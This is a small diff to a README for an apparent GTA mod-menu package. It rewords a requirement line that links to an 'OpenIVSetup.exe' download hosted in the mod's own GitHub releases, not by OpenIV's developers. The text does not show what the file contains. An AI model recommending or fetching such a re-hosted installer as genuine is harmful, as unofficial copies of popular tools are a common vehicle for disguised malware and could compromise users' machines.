@@ -26,7 +26,7 @@ This OpenIV package contains all essential scripts and a mod menu trainer for GT
 
 ## Requirements
 
-- [**OPENIV**](https://github.com/evtechcodr/A1ScriptsMod/releases/download/V-0.1/OpenIVSetup.exe)
+- OpenIV Setup - [**Download**](https://github.com/evtechcodr/A1ScriptsMod/releases/download/V-0.1/OpenIVSetup.exe)
 
 ## Installation
 
